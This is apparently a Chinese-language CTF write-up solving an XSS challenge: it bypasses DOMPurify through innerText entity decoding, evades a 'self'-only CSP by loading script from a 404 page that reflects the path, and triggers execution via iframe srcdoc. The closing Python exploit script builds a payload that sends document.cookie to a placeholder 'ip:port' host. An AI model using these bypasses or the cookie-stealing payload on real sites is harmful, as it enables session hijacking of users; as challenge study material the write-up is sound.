# 绕过DOMPurify
`index.js`中有如下代码：
```js
const sanitizedText = sanitizeContent(atob(decodeURI(queryText)));
    if (sanitizedText.length > 0) {
        textInput.innerHTML = sanitizedText;             // 写入预览区
        contentDisplay.innerHTML = textInput.innerText;  // 写入效果显示区
```
queryText被sanitize之后，先通过innerHTML写入textInput，再用innerHTML复制到contentDisplay中。

innerText会对元素内容先html实体解码后再输出，所以在sanitize之后有一次html实体解码可以用来绕过。

# 绕过CSP
## 404页面
题目设置了以下csp：
```js
const csp = "script-src 'self'; object-src 'none'; base-uri 'none';";
```
只允许加载来自self的js脚本。

服务器有一个显示404页面的中间件，会将path显示到页面，内容可控。
```js
app.use((req, res) => {
  res.status(200).type('text/plain').send(`${decodeURI(req.path)} : invalid path`);
}); // 404 页面
```

所以思路就是将js代码写入path，然后通过404页面返回，用script标签加载，类似jsonp。

## js代码注入
注入的方法应该挺多的，这里只提供一个trick。

访问`/test`会得到：
```
/test : invalid path
```
但`//test`会将test认为是域名，被csp拦截。

可以用正则表达式绕过，javascript中正则表达式不需要引号，只需要用`/`包裹即可。
```js
>>> /asd/.test('asasad');
false
```

payload:
```html
<script src=a/%0aalert(1);//></script>
```

# 链接起来
通过innerHTML注入是一个DOM XSS，在执行innerHTML之前DOM树已经解析好了，此时再插入script标签是不会进行解析的，这时要执行js代码一般考虑这两个方向：
* 触发监听器，如img onerror之类的。（CSP限制了）
* 使用iframe嵌入一个子页面，在子页面加载时可以重新唤起DOM解析器进行解析script标签。

使用iframe的srcdoc即可。

payload：
```
<iframe srcdoc='<script src=a/%0aalert(1);//></script>'></iframe>
```

## 利用脚本
```python
from urllib.parse import quote
import base64
import re

def html_entity_encode(text : str) -> str:
    def repl(match : re.Match) -> str:
        table = {
            '\'' : "&apos;",
            '"' : "&quot;",
            "<" : '&lt;',
            ">" : "&gt;"
        }

        char = match.groups()[0]
        return table[char]

    res = re.sub(r"(['\"<>])", repl, text)
    return res

payload = '''
a/
fetch("http://ip:port/" + encodeURI(document.cookie)) //
'''.strip()

payload = '''
<iframe srcdoc="<script src={}></script>"></iframe>
'''.format(quote(payload, safe='/;:+')).strip()

payload = html_entity_encode(payload)
payload = base64.b64encode(payload.encode()).decode()

print(payload)
```